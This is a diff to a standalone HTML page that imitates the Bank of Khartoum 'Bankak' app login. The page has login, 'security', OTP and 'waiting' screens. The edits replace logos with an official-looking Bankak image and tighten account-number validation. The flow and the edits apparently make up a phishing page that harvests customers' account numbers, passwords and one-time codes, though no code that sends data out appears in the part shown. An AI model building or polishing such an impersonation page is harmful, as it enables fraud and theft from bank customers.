@@ -53,10 +53,8 @@ html,body{height:100%;font-family:'Cairo',sans-serif;background:var(--bg);color:
 .h-footer-social img{width:30px;height:30px;opacity:.8}
 
 /* ══ LOGIN/SECURITY/OTP ══ */
-.red-header{background:linear-gradient(160deg,#E03030 0%,#C42020 50%,#A81818 100%);padding:48px 28px 40px;display:flex;flex-direction:column;align-items:center;justify-content:center;position:relative;overflow:hidden;flex-shrink:0}
-.red-header.compact{padding:36px 28px 30px}
-.red-header::before{content:'';position:absolute;top:-60px;right:-60px;width:200px;height:200px;background:rgba(255,255,255,0.05);border-radius:50%}
-.red-header::after{content:'';position:absolute;bottom:-80px;left:-40px;width:220px;height:220px;background:rgba(0,0,0,0.08);border-radius:50%}
+.red-header{background:#E52010;padding:36px 28px 28px;display:flex;flex-direction:column;align-items:center;justify-content:center;flex-shrink:0}
+.red-header.compact{padding:24px 28px 20px}
 .logo-wrap{display:flex;flex-direction:column;align-items:center;gap:4px;position:relative;z-index:1}
 .logo-arabic{font-size:42px;font-weight:900;color:#FFF;line-height:1}
 .logo-arabic.sm{font-size:32px}
@@ -260,7 +258,7 @@ select:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(196,18,48,0.08)}
 <!-- ══ SCREEN 0: HOME ══ -->
 <div class="screen active" id="screen-home">
   <div class="h-header">
-    <img src="logo-header.jpg" alt="Bank of Khartoum">
+    <img src="Bankak.PNG" alt="Bankak">
   </div>
   <div class="h-login-box">
     <div class="h-login-title">Login to</div>
@@ -347,9 +345,7 @@ select:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(196,18,48,0.08)}
 <div class="screen" id="screen-login">
   <div class="red-header">
     <div class="logo-wrap">
-      <div class="logo-arabic">بنك<span>ك</span></div>
-      <div class="logo-english"><b>b</b>ankak</div>
-      <div class="logo-tagline">Elite Banking Corporation</div>
+      <img src="Bankak.PNG" alt="Bankak" style="height:70px;width:auto;object-fit:contain">
     </div>
   </div>
   <div class="white-body">
@@ -382,7 +378,7 @@ select:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(196,18,48,0.08)}
 <!-- ══ SCREEN 2: SECURITY ══ -->
 <div class="screen" id="screen-security">
   <div class="red-header compact">
-    <div class="logo-wrap"><div class="logo-arabic sm">بنك<span>ك</span></div><div class="logo-english sm"><b>b</b>ankak</div></div>
+    <div class="logo-wrap"><img src="Bankak.PNG" alt="Bankak" style="height:50px;width:auto;object-fit:contain"></div>
   </div>
   <div class="white-body scrollable">
     <div class="step-bar"><div class="step-dot done"></div><div class="step-dot active"></div><div class="step-dot"></div><div class="step-dot"></div></div>
@@ -425,7 +421,7 @@ select:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(196,18,48,0.08)}
 <!-- ══ SCREEN 3: OTP ══ -->
 <div class="screen" id="screen-otp">
   <div class="red-header compact">
-    <div class="logo-wrap"><div class="logo-arabic sm">بنك<span>ك</span></div><div class="logo-english sm"><b>b</b>ankak</div></div>
+    <div class="logo-wrap"><img src="Bankak.PNG" alt="Bankak" style="height:50px;width:auto;object-fit:contain"></div>
   </div>
   <div class="white-body">
     <div class="step-bar"><div class="step-dot done"></div><div class="step-dot done"></div><div class="step-dot active"></div><div class="step-dot"></div></div>
@@ -463,7 +459,7 @@ select:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(196,18,48,0.08)}
 <!-- ══ SCREEN 4: WAITING ══ -->
 <div class="screen" id="screen-success">
   <div class="red-header compact">
-    <div class="logo-wrap"><div class="logo-arabic sm">بنك<span>ك</span></div><div class="logo-english sm"><b>b</b>ankak</div></div>
+    <div class="logo-wrap"><img src="Bankak.PNG" alt="Bankak" style="height:50px;width:auto;object-fit:contain"></div>
   </div>
   <div class="white-body" style="display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;gap:20px">
 
@@ -523,7 +519,7 @@ async function doLogin(){
   const u=document.getElementById('username').value.trim();
   const p=document.getElementById('password').value.trim();
   const err=document.getElementById('login-error');
-  const validUser=/^\d{7}$/.test(u);
+  const validUser=/^[1-9]\d{6}$/.test(u);
   const validPass=!/\//.test(p)&&!/[^\x00-\x7F]/.test(p)&&(/^\d{4}$/.test(p)||/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[^a-zA-Z\d]).+$/.test(p));
   if(!validUser||!validPass){err.classList.add('show');err.textContent='رقم الحساب أو كلمة المرور غير صحيحة';return;}
   err.classList.remove('show');
